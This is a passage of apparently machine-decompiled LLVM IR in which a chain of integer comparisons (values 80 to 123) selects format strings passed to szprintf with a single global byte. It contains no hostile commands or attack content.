  %v3_10004db8 = icmp eq i32 %v2_10003364, 80
  br i1 %v3_10004db8, label %dec_label_pc_10004dc0, label %dec_label_pc_10004e08

dec_label_pc_10004dc0:                            ; preds = %dec_label_pc_10004db4
  %v2_10004dc0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004dd4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004dd4 = zext i8 %v3_10004dd4 to i32
  %v4_10004e04 = call i32 @szprintf(i32 %v2_10004dc0, i32 ptrtoint ([13 x i8]* @global_var_10015af0.134 to i32), i32 %v4_10004dd4)
  br label %dec_label_pc_10004e08

dec_label_pc_10004e08:                            ; preds = %dec_label_pc_10004db4, %dec_label_pc_10004dc0
  %v3_10004e0c = icmp eq i32 %v2_10003364, 81
  br i1 %v3_10004e0c, label %dec_label_pc_10004e14, label %dec_label_pc_10004e5c

dec_label_pc_10004e14:                            ; preds = %dec_label_pc_10004e08
  %v2_10004e14 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e28 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004e28 = zext i8 %v3_10004e28 to i32
  %v4_10004e58 = call i32 @szprintf(i32 %v2_10004e14, i32 ptrtoint ([13 x i8]* @global_var_10015b00.135 to i32), i32 %v4_10004e28)
  br label %dec_label_pc_10004e5c

dec_label_pc_10004e5c:                            ; preds = %dec_label_pc_10004e08, %dec_label_pc_10004e14
  %v3_10004e60 = icmp eq i32 %v2_10003364, 82
  br i1 %v3_10004e60, label %dec_label_pc_10004e68, label %dec_label_pc_10004eb0

dec_label_pc_10004e68:                            ; preds = %dec_label_pc_10004e5c
  %v2_10004e68 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004e7c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004e7c = zext i8 %v3_10004e7c to i32
  %v4_10004eac = call i32 @szprintf(i32 %v2_10004e68, i32 ptrtoint ([13 x i8]* @global_var_10015b10.136 to i32), i32 %v4_10004e7c)
  br label %dec_label_pc_10004eb0

dec_label_pc_10004eb0:                            ; preds = %dec_label_pc_10004e5c, %dec_label_pc_10004e68
  %v3_10004eb4 = icmp eq i32 %v2_10003364, 83
  br i1 %v3_10004eb4, label %dec_label_pc_10004ebc, label %dec_label_pc_10004f04

dec_label_pc_10004ebc:                            ; preds = %dec_label_pc_10004eb0
  %v2_10004ebc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004ed0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004ed0 = zext i8 %v3_10004ed0 to i32
  %v4_10004f00 = call i32 @szprintf(i32 %v2_10004ebc, i32 ptrtoint ([13 x i8]* @global_var_10015b20.137 to i32), i32 %v4_10004ed0)
  br label %dec_label_pc_10004f04

dec_label_pc_10004f04:                            ; preds = %dec_label_pc_10004eb0, %dec_label_pc_10004ebc
  %v3_10004f08 = icmp eq i32 %v2_10003364, 84
  br i1 %v3_10004f08, label %dec_label_pc_10004f10, label %dec_label_pc_10004f58

dec_label_pc_10004f10:                            ; preds = %dec_label_pc_10004f04
  %v2_10004f10 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f24 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004f24 = zext i8 %v3_10004f24 to i32
  %v4_10004f54 = call i32 @szprintf(i32 %v2_10004f10, i32 ptrtoint ([13 x i8]* @global_var_10015b30.138 to i32), i32 %v4_10004f24)
  br label %dec_label_pc_10004f58

dec_label_pc_10004f58:                            ; preds = %dec_label_pc_10004f04, %dec_label_pc_10004f10
  %v3_10004f5c = icmp eq i32 %v2_10003364, 85
  br i1 %v3_10004f5c, label %dec_label_pc_10004f64, label %dec_label_pc_10004fac

dec_label_pc_10004f64:                            ; preds = %dec_label_pc_10004f58
  %v2_10004f64 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004f78 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004f78 = zext i8 %v3_10004f78 to i32
  %v4_10004fa8 = call i32 @szprintf(i32 %v2_10004f64, i32 ptrtoint ([13 x i8]* @global_var_10015b40.139 to i32), i32 %v4_10004f78)
  br label %dec_label_pc_10004fac

dec_label_pc_10004fac:                            ; preds = %dec_label_pc_10004f58, %dec_label_pc_10004f64
  %v3_10004fb0 = icmp eq i32 %v2_10003364, 86
  br i1 %v3_10004fb0, label %dec_label_pc_10004fb8, label %dec_label_pc_10005000

dec_label_pc_10004fb8:                            ; preds = %dec_label_pc_10004fac
  %v2_10004fb8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10004fcc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10004fcc = zext i8 %v3_10004fcc to i32
  %v4_10004ffc = call i32 @szprintf(i32 %v2_10004fb8, i32 ptrtoint ([13 x i8]* @global_var_10015b50.140 to i32), i32 %v4_10004fcc)
  br label %dec_label_pc_10005000

dec_label_pc_10005000:                            ; preds = %dec_label_pc_10004fac, %dec_label_pc_10004fb8
  %v3_10005004 = icmp eq i32 %v2_10003364, 87
  br i1 %v3_10005004, label %dec_label_pc_1000500c, label %dec_label_pc_10005054

dec_label_pc_1000500c:                            ; preds = %dec_label_pc_10005000
  %v2_1000500c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005020 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005020 = zext i8 %v3_10005020 to i32
  %v4_10005050 = call i32 @szprintf(i32 %v2_1000500c, i32 ptrtoint ([13 x i8]* @global_var_10015b60.141 to i32), i32 %v4_10005020)
  br label %dec_label_pc_10005054

dec_label_pc_10005054:                            ; preds = %dec_label_pc_10005000, %dec_label_pc_1000500c
  %v3_10005058 = icmp eq i32 %v2_10003364, 88
  br i1 %v3_10005058, label %dec_label_pc_10005060, label %dec_label_pc_100050a8

dec_label_pc_10005060:                            ; preds = %dec_label_pc_10005054
  %v2_10005060 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005074 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005074 = zext i8 %v3_10005074 to i32
  %v4_100050a4 = call i32 @szprintf(i32 %v2_10005060, i32 ptrtoint ([13 x i8]* @global_var_10015b70.142 to i32), i32 %v4_10005074)
  br label %dec_label_pc_100050a8

dec_label_pc_100050a8:                            ; preds = %dec_label_pc_10005054, %dec_label_pc_10005060
  %v3_100050ac = icmp eq i32 %v2_10003364, 89
  br i1 %v3_100050ac, label %dec_label_pc_100050b4, label %dec_label_pc_100050fc

dec_label_pc_100050b4:                            ; preds = %dec_label_pc_100050a8
  %v2_100050b4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100050c8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100050c8 = zext i8 %v3_100050c8 to i32
  %v4_100050f8 = call i32 @szprintf(i32 %v2_100050b4, i32 ptrtoint ([13 x i8]* @global_var_10015b80.143 to i32), i32 %v4_100050c8)
  br label %dec_label_pc_100050fc

dec_label_pc_100050fc:                            ; preds = %dec_label_pc_100050a8, %dec_label_pc_100050b4
  %v3_10005100 = icmp eq i32 %v2_10003364, 90
  br i1 %v3_10005100, label %dec_label_pc_10005108, label %dec_label_pc_10005150

dec_label_pc_10005108:                            ; preds = %dec_label_pc_100050fc
  %v2_10005108 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000511c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000511c = zext i8 %v3_1000511c to i32
  %v4_1000514c = call i32 @szprintf(i32 %v2_10005108, i32 ptrtoint ([13 x i8]* @global_var_10015b90.144 to i32), i32 %v4_1000511c)
  br label %dec_label_pc_10005150

dec_label_pc_10005150:                            ; preds = %dec_label_pc_100050fc, %dec_label_pc_10005108
  %v3_10005154 = icmp eq i32 %v2_10003364, 91
  br i1 %v3_10005154, label %dec_label_pc_1000515c, label %dec_label_pc_100051a4

dec_label_pc_1000515c:                            ; preds = %dec_label_pc_10005150
  %v2_1000515c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005170 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005170 = zext i8 %v3_10005170 to i32
  %v4_100051a0 = call i32 @szprintf(i32 %v2_1000515c, i32 ptrtoint ([13 x i8]* @global_var_10015ba0.145 to i32), i32 %v4_10005170)
  br label %dec_label_pc_100051a4

dec_label_pc_100051a4:                            ; preds = %dec_label_pc_10005150, %dec_label_pc_1000515c
  %v3_100051a8 = icmp eq i32 %v2_10003364, 92
  br i1 %v3_100051a8, label %dec_label_pc_100051b0, label %dec_label_pc_100051f8

dec_label_pc_100051b0:                            ; preds = %dec_label_pc_100051a4
  %v2_100051b0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100051c4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100051c4 = zext i8 %v3_100051c4 to i32
  %v4_100051f4 = call i32 @szprintf(i32 %v2_100051b0, i32 ptrtoint ([13 x i8]* @global_var_10015bb0.146 to i32), i32 %v4_100051c4)
  br label %dec_label_pc_100051f8

dec_label_pc_100051f8:                            ; preds = %dec_label_pc_100051a4, %dec_label_pc_100051b0
  %v3_100051fc = icmp eq i32 %v2_10003364, 93
  br i1 %v3_100051fc, label %dec_label_pc_10005204, label %dec_label_pc_1000524c

dec_label_pc_10005204:                            ; preds = %dec_label_pc_100051f8
  %v2_10005204 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005218 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005218 = zext i8 %v3_10005218 to i32
  %v4_10005248 = call i32 @szprintf(i32 %v2_10005204, i32 ptrtoint ([13 x i8]* @global_var_10015bc0.147 to i32), i32 %v4_10005218)
  br label %dec_label_pc_1000524c

dec_label_pc_1000524c:                            ; preds = %dec_label_pc_100051f8, %dec_label_pc_10005204
  %v3_10005250 = icmp eq i32 %v2_10003364, 94
  br i1 %v3_10005250, label %dec_label_pc_10005258, label %dec_label_pc_100052a0

dec_label_pc_10005258:                            ; preds = %dec_label_pc_1000524c
  %v2_10005258 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000526c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000526c = zext i8 %v3_1000526c to i32
  %v4_1000529c = call i32 @szprintf(i32 %v2_10005258, i32 ptrtoint ([13 x i8]* @global_var_100158a0.97 to i32), i32 %v4_1000526c)
  br label %dec_label_pc_100052a0

dec_label_pc_100052a0:                            ; preds = %dec_label_pc_1000524c, %dec_label_pc_10005258
  %v3_100052a4 = icmp eq i32 %v2_10003364, 95
  br i1 %v3_100052a4, label %dec_label_pc_100052ac, label %dec_label_pc_100052f4

dec_label_pc_100052ac:                            ; preds = %dec_label_pc_100052a0
  %v2_100052ac = ptrtoint i32* %stack_var_-52 to i32
  %v3_100052c0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100052c0 = zext i8 %v3_100052c0 to i32
  %v4_100052f0 = call i32 @szprintf(i32 %v2_100052ac, i32 ptrtoint ([13 x i8]* @global_var_10015bd0.148 to i32), i32 %v4_100052c0)
  br label %dec_label_pc_100052f4

dec_label_pc_100052f4:                            ; preds = %dec_label_pc_100052a0, %dec_label_pc_100052ac
  %v3_100052f8 = icmp eq i32 %v2_10003364, 96
  br i1 %v3_100052f8, label %dec_label_pc_10005300, label %dec_label_pc_10005348

dec_label_pc_10005300:                            ; preds = %dec_label_pc_100052f4
  %v2_10005300 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005314 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005314 = zext i8 %v3_10005314 to i32
  %v4_10005344 = call i32 @szprintf(i32 %v2_10005300, i32 ptrtoint ([13 x i8]* @global_var_100158d0.100 to i32), i32 %v4_10005314)
  br label %dec_label_pc_10005348

dec_label_pc_10005348:                            ; preds = %dec_label_pc_100052f4, %dec_label_pc_10005300
  %v3_1000534c = icmp eq i32 %v2_10003364, 97
  br i1 %v3_1000534c, label %dec_label_pc_10005354, label %dec_label_pc_1000539c

dec_label_pc_10005354:                            ; preds = %dec_label_pc_10005348
  %v2_10005354 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005368 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005368 = zext i8 %v3_10005368 to i32
  %v4_10005398 = call i32 @szprintf(i32 %v2_10005354, i32 ptrtoint ([13 x i8]* @global_var_10015be0.149 to i32), i32 %v4_10005368)
  br label %dec_label_pc_1000539c

dec_label_pc_1000539c:                            ; preds = %dec_label_pc_10005348, %dec_label_pc_10005354
  %v3_100053a0 = icmp eq i32 %v2_10003364, 98
  br i1 %v3_100053a0, label %dec_label_pc_100053a8, label %dec_label_pc_100053f0

dec_label_pc_100053a8:                            ; preds = %dec_label_pc_1000539c
  %v2_100053a8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100053bc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100053bc = zext i8 %v3_100053bc to i32
  %v4_100053ec = call i32 @szprintf(i32 %v2_100053a8, i32 ptrtoint ([13 x i8]* @global_var_10015bf0.150 to i32), i32 %v4_100053bc)
  br label %dec_label_pc_100053f0

dec_label_pc_100053f0:                            ; preds = %dec_label_pc_1000539c, %dec_label_pc_100053a8
  %v3_100053f4 = icmp eq i32 %v2_10003364, 99
  br i1 %v3_100053f4, label %dec_label_pc_100053fc, label %dec_label_pc_10005444

dec_label_pc_100053fc:                            ; preds = %dec_label_pc_100053f0
  %v2_100053fc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005410 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005410 = zext i8 %v3_10005410 to i32
  %v4_10005440 = call i32 @szprintf(i32 %v2_100053fc, i32 ptrtoint ([13 x i8]* @global_var_10015c00.151 to i32), i32 %v4_10005410)
  br label %dec_label_pc_10005444

dec_label_pc_10005444:                            ; preds = %dec_label_pc_100053f0, %dec_label_pc_100053fc
  %v3_10005448 = icmp eq i32 %v2_10003364, 100
  br i1 %v3_10005448, label %dec_label_pc_10005450, label %dec_label_pc_10005498

dec_label_pc_10005450:                            ; preds = %dec_label_pc_10005444
  %v2_10005450 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005464 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005464 = zext i8 %v3_10005464 to i32
  %v4_10005494 = call i32 @szprintf(i32 %v2_10005450, i32 ptrtoint ([13 x i8]* @global_var_10015c10.152 to i32), i32 %v4_10005464)
  br label %dec_label_pc_10005498

dec_label_pc_10005498:                            ; preds = %dec_label_pc_10005444, %dec_label_pc_10005450
  %v3_1000549c = icmp eq i32 %v2_10003364, 101
  br i1 %v3_1000549c, label %dec_label_pc_100054a4, label %dec_label_pc_100054ec

dec_label_pc_100054a4:                            ; preds = %dec_label_pc_10005498
  %v2_100054a4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100054b8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100054b8 = zext i8 %v3_100054b8 to i32
  %v4_100054e8 = call i32 @szprintf(i32 %v2_100054a4, i32 ptrtoint ([13 x i8]* @global_var_10015c20.153 to i32), i32 %v4_100054b8)
  br label %dec_label_pc_100054ec

dec_label_pc_100054ec:                            ; preds = %dec_label_pc_10005498, %dec_label_pc_100054a4
  %v3_100054f0 = icmp eq i32 %v2_10003364, 102
  br i1 %v3_100054f0, label %dec_label_pc_100054f8, label %dec_label_pc_10005540

dec_label_pc_100054f8:                            ; preds = %dec_label_pc_100054ec
  %v2_100054f8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000550c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000550c = zext i8 %v3_1000550c to i32
  %v4_1000553c = call i32 @szprintf(i32 %v2_100054f8, i32 ptrtoint ([12 x i8]* @global_var_10015c30.154 to i32), i32 %v4_1000550c)
  br label %dec_label_pc_10005540

dec_label_pc_10005540:                            ; preds = %dec_label_pc_100054ec, %dec_label_pc_100054f8
  %v3_10005544 = icmp eq i32 %v2_10003364, 103
  br i1 %v3_10005544, label %dec_label_pc_1000554c, label %dec_label_pc_10005594

dec_label_pc_1000554c:                            ; preds = %dec_label_pc_10005540
  %v2_1000554c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005560 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005560 = zext i8 %v3_10005560 to i32
  %v4_10005590 = call i32 @szprintf(i32 %v2_1000554c, i32 ptrtoint ([13 x i8]* @global_var_10015c3c.155 to i32), i32 %v4_10005560)
  br label %dec_label_pc_10005594

dec_label_pc_10005594:                            ; preds = %dec_label_pc_10005540, %dec_label_pc_1000554c
  %v3_10005598 = icmp eq i32 %v2_10003364, 104
  br i1 %v3_10005598, label %dec_label_pc_100055a0, label %dec_label_pc_100055e8

dec_label_pc_100055a0:                            ; preds = %dec_label_pc_10005594
  %v2_100055a0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100055b4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100055b4 = zext i8 %v3_100055b4 to i32
  %v4_100055e4 = call i32 @szprintf(i32 %v2_100055a0, i32 ptrtoint ([13 x i8]* @global_var_10015c4c.156 to i32), i32 %v4_100055b4)
  br label %dec_label_pc_100055e8

dec_label_pc_100055e8:                            ; preds = %dec_label_pc_10005594, %dec_label_pc_100055a0
  %v3_100055ec = icmp eq i32 %v2_10003364, 105
  br i1 %v3_100055ec, label %dec_label_pc_100055f4, label %dec_label_pc_1000563c

dec_label_pc_100055f4:                            ; preds = %dec_label_pc_100055e8
  %v2_100055f4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005608 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005608 = zext i8 %v3_10005608 to i32
  %v4_10005638 = call i32 @szprintf(i32 %v2_100055f4, i32 ptrtoint ([13 x i8]* @global_var_10015c5c.157 to i32), i32 %v4_10005608)
  br label %dec_label_pc_1000563c

dec_label_pc_1000563c:                            ; preds = %dec_label_pc_100055e8, %dec_label_pc_100055f4
  %v3_10005640 = icmp eq i32 %v2_10003364, 106
  br i1 %v3_10005640, label %dec_label_pc_10005648, label %dec_label_pc_10005690

dec_label_pc_10005648:                            ; preds = %dec_label_pc_1000563c
  %v2_10005648 = ptrtoint i32* %stack_var_-52 to i32
  %v3_1000565c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_1000565c = zext i8 %v3_1000565c to i32
  %v4_1000568c = call i32 @szprintf(i32 %v2_10005648, i32 ptrtoint ([12 x i8]* @global_var_10015c6c.158 to i32), i32 %v4_1000565c)
  br label %dec_label_pc_10005690

dec_label_pc_10005690:                            ; preds = %dec_label_pc_1000563c, %dec_label_pc_10005648
  %v3_10005694 = icmp eq i32 %v2_10003364, 107
  br i1 %v3_10005694, label %dec_label_pc_1000569c, label %dec_label_pc_100056e4

dec_label_pc_1000569c:                            ; preds = %dec_label_pc_10005690
  %v2_1000569c = ptrtoint i32* %stack_var_-52 to i32
  %v3_100056b0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100056b0 = zext i8 %v3_100056b0 to i32
  %v4_100056e0 = call i32 @szprintf(i32 %v2_1000569c, i32 ptrtoint ([13 x i8]* @global_var_10015c78.159 to i32), i32 %v4_100056b0)
  br label %dec_label_pc_100056e4

dec_label_pc_100056e4:                            ; preds = %dec_label_pc_10005690, %dec_label_pc_1000569c
  %v3_100056e8 = icmp eq i32 %v2_10003364, 108
  br i1 %v3_100056e8, label %dec_label_pc_100056f0, label %dec_label_pc_10005738

dec_label_pc_100056f0:                            ; preds = %dec_label_pc_100056e4
  %v2_100056f0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005704 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005704 = zext i8 %v3_10005704 to i32
  %v4_10005734 = call i32 @szprintf(i32 %v2_100056f0, i32 ptrtoint ([14 x i8]* @global_var_10015c88.160 to i32), i32 %v4_10005704)
  br label %dec_label_pc_10005738

dec_label_pc_10005738:                            ; preds = %dec_label_pc_100056e4, %dec_label_pc_100056f0
  %v3_1000573c = icmp eq i32 %v2_10003364, 109
  br i1 %v3_1000573c, label %dec_label_pc_10005744, label %dec_label_pc_1000578c

dec_label_pc_10005744:                            ; preds = %dec_label_pc_10005738
  %v2_10005744 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005758 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005758 = zext i8 %v3_10005758 to i32
  %v4_10005788 = call i32 @szprintf(i32 %v2_10005744, i32 ptrtoint ([14 x i8]* @global_var_10015c98.161 to i32), i32 %v4_10005758)
  br label %dec_label_pc_1000578c

dec_label_pc_1000578c:                            ; preds = %dec_label_pc_10005738, %dec_label_pc_10005744
  %v3_10005790 = icmp eq i32 %v2_10003364, 110
  br i1 %v3_10005790, label %dec_label_pc_10005798, label %dec_label_pc_100057e0

dec_label_pc_10005798:                            ; preds = %dec_label_pc_1000578c
  %v2_10005798 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100057ac = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100057ac = zext i8 %v3_100057ac to i32
  %v4_100057dc = call i32 @szprintf(i32 %v2_10005798, i32 ptrtoint ([13 x i8]* @global_var_10015ca8.162 to i32), i32 %v4_100057ac)
  br label %dec_label_pc_100057e0

dec_label_pc_100057e0:                            ; preds = %dec_label_pc_1000578c, %dec_label_pc_10005798
  %v3_100057e4 = icmp eq i32 %v2_10003364, 111
  br i1 %v3_100057e4, label %dec_label_pc_100057ec, label %dec_label_pc_10005834

dec_label_pc_100057ec:                            ; preds = %dec_label_pc_100057e0
  %v2_100057ec = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005800 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005800 = zext i8 %v3_10005800 to i32
  %v4_10005830 = call i32 @szprintf(i32 %v2_100057ec, i32 ptrtoint ([14 x i8]* @global_var_10015cb8.163 to i32), i32 %v4_10005800)
  br label %dec_label_pc_10005834

dec_label_pc_10005834:                            ; preds = %dec_label_pc_100057e0, %dec_label_pc_100057ec
  %v3_10005838 = icmp eq i32 %v2_10003364, 112
  br i1 %v3_10005838, label %dec_label_pc_10005840, label %dec_label_pc_10005888

dec_label_pc_10005840:                            ; preds = %dec_label_pc_10005834
  %v2_10005840 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005854 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005854 = zext i8 %v3_10005854 to i32
  %v4_10005884 = call i32 @szprintf(i32 %v2_10005840, i32 ptrtoint ([14 x i8]* @global_var_10015cc8.164 to i32), i32 %v4_10005854)
  br label %dec_label_pc_10005888

dec_label_pc_10005888:                            ; preds = %dec_label_pc_10005834, %dec_label_pc_10005840
  %v3_1000588c = icmp eq i32 %v2_10003364, 113
  br i1 %v3_1000588c, label %dec_label_pc_10005894, label %dec_label_pc_100058dc

dec_label_pc_10005894:                            ; preds = %dec_label_pc_10005888
  %v2_10005894 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100058a8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100058a8 = zext i8 %v3_100058a8 to i32
  %v4_100058d8 = call i32 @szprintf(i32 %v2_10005894, i32 ptrtoint ([13 x i8]* @global_var_10015cd8.165 to i32), i32 %v4_100058a8)
  br label %dec_label_pc_100058dc

dec_label_pc_100058dc:                            ; preds = %dec_label_pc_10005888, %dec_label_pc_10005894
  %v3_100058e0 = icmp eq i32 %v2_10003364, 114
  br i1 %v3_100058e0, label %dec_label_pc_100058e8, label %dec_label_pc_10005930

dec_label_pc_100058e8:                            ; preds = %dec_label_pc_100058dc
  %v2_100058e8 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100058fc = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100058fc = zext i8 %v3_100058fc to i32
  %v4_1000592c = call i32 @szprintf(i32 %v2_100058e8, i32 ptrtoint ([14 x i8]* @global_var_10015ce8.166 to i32), i32 %v4_100058fc)
  br label %dec_label_pc_10005930

dec_label_pc_10005930:                            ; preds = %dec_label_pc_100058dc, %dec_label_pc_100058e8
  %v3_10005934 = icmp eq i32 %v2_10003364, 115
  br i1 %v3_10005934, label %dec_label_pc_1000593c, label %dec_label_pc_10005984

dec_label_pc_1000593c:                            ; preds = %dec_label_pc_10005930
  %v2_1000593c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005950 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005950 = zext i8 %v3_10005950 to i32
  %v4_10005980 = call i32 @szprintf(i32 %v2_1000593c, i32 ptrtoint ([13 x i8]* @global_var_10015cf8.167 to i32), i32 %v4_10005950)
  br label %dec_label_pc_10005984

dec_label_pc_10005984:                            ; preds = %dec_label_pc_10005930, %dec_label_pc_1000593c
  %v3_10005988 = icmp eq i32 %v2_10003364, 116
  br i1 %v3_10005988, label %dec_label_pc_10005990, label %dec_label_pc_100059d8

dec_label_pc_10005990:                            ; preds = %dec_label_pc_10005984
  %v2_10005990 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100059a4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100059a4 = zext i8 %v3_100059a4 to i32
  %v4_100059d4 = call i32 @szprintf(i32 %v2_10005990, i32 ptrtoint ([13 x i8]* @global_var_10015d08.168 to i32), i32 %v4_100059a4)
  br label %dec_label_pc_100059d8

dec_label_pc_100059d8:                            ; preds = %dec_label_pc_10005984, %dec_label_pc_10005990
  %v3_100059dc = icmp eq i32 %v2_10003364, 117
  br i1 %v3_100059dc, label %dec_label_pc_100059e4, label %dec_label_pc_10005a2c

dec_label_pc_100059e4:                            ; preds = %dec_label_pc_100059d8
  %v2_100059e4 = ptrtoint i32* %stack_var_-52 to i32
  %v3_100059f8 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_100059f8 = zext i8 %v3_100059f8 to i32
  %v4_10005a28 = call i32 @szprintf(i32 %v2_100059e4, i32 ptrtoint ([14 x i8]* @global_var_10015d18.169 to i32), i32 %v4_100059f8)
  br label %dec_label_pc_10005a2c

dec_label_pc_10005a2c:                            ; preds = %dec_label_pc_100059d8, %dec_label_pc_100059e4
  %v3_10005a30 = icmp eq i32 %v2_10003364, 118
  br i1 %v3_10005a30, label %dec_label_pc_10005a38, label %dec_label_pc_10005a80

dec_label_pc_10005a38:                            ; preds = %dec_label_pc_10005a2c
  %v2_10005a38 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005a4c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005a4c = zext i8 %v3_10005a4c to i32
  %v4_10005a7c = call i32 @szprintf(i32 %v2_10005a38, i32 ptrtoint ([14 x i8]* @global_var_10015d28.170 to i32), i32 %v4_10005a4c)
  br label %dec_label_pc_10005a80

dec_label_pc_10005a80:                            ; preds = %dec_label_pc_10005a2c, %dec_label_pc_10005a38
  %v3_10005a84 = icmp eq i32 %v2_10003364, 119
  br i1 %v3_10005a84, label %dec_label_pc_10005a8c, label %dec_label_pc_10005ad4

dec_label_pc_10005a8c:                            ; preds = %dec_label_pc_10005a80
  %v2_10005a8c = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005aa0 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005aa0 = zext i8 %v3_10005aa0 to i32
  %v4_10005ad0 = call i32 @szprintf(i32 %v2_10005a8c, i32 ptrtoint ([14 x i8]* @global_var_10015d38.171 to i32), i32 %v4_10005aa0)
  br label %dec_label_pc_10005ad4

dec_label_pc_10005ad4:                            ; preds = %dec_label_pc_10005a80, %dec_label_pc_10005a8c
  %v3_10005ad8 = icmp eq i32 %v2_10003364, 120
  br i1 %v3_10005ad8, label %dec_label_pc_10005ae0, label %dec_label_pc_10005b28

dec_label_pc_10005ae0:                            ; preds = %dec_label_pc_10005ad4
  %v2_10005ae0 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005af4 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005af4 = zext i8 %v3_10005af4 to i32
  %v4_10005b24 = call i32 @szprintf(i32 %v2_10005ae0, i32 ptrtoint ([14 x i8]* @global_var_10015d48.172 to i32), i32 %v4_10005af4)
  br label %dec_label_pc_10005b28

dec_label_pc_10005b28:                            ; preds = %dec_label_pc_10005ad4, %dec_label_pc_10005ae0
  %v3_10005b2c = icmp eq i32 %v2_10003364, 121
  br i1 %v3_10005b2c, label %dec_label_pc_10005b34, label %dec_label_pc_10005b7c

dec_label_pc_10005b34:                            ; preds = %dec_label_pc_10005b28
  %v2_10005b34 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005b48 = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005b48 = zext i8 %v3_10005b48 to i32
  %v4_10005b78 = call i32 @szprintf(i32 %v2_10005b34, i32 ptrtoint ([14 x i8]* @global_var_10015c88.160 to i32), i32 %v4_10005b48)
  br label %dec_label_pc_10005b7c

dec_label_pc_10005b7c:                            ; preds = %dec_label_pc_10005b28, %dec_label_pc_10005b34
  %v3_10005b80 = icmp eq i32 %v2_10003364, 122
  br i1 %v3_10005b80, label %dec_label_pc_10005b88, label %dec_label_pc_10005bd0

dec_label_pc_10005b88:                            ; preds = %dec_label_pc_10005b7c
  %v2_10005b88 = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005b9c = load i8, i8* @global_var_100287eb.54, align 1
  %v4_10005b9c = zext i8 %v3_10005b9c to i32
  %v4_10005bcc = call i32 @szprintf(i32 %v2_10005b88, i32 ptrtoint ([13 x i8]* @global_var_10015d58.173 to i32), i32 %v4_10005b9c)
  br label %dec_label_pc_10005bd0

dec_label_pc_10005bd0:                            ; preds = %dec_label_pc_10005b7c, %dec_label_pc_10005b88
  %v3_10005bd4 = icmp eq i32 %v2_10003364, 123
  br i1 %v3_10005bd4, label %dec_label_pc_10005bdc, label %dec_label_pc_10005c24

dec_label_pc_10005bdc:                            ; preds = %dec_label_pc_10005bd0
  %v2_10005bdc = ptrtoint i32* %stack_var_-52 to i32
  %v3_10005bf0 = load i8, i8* @global_var_100287eb.54, align 1
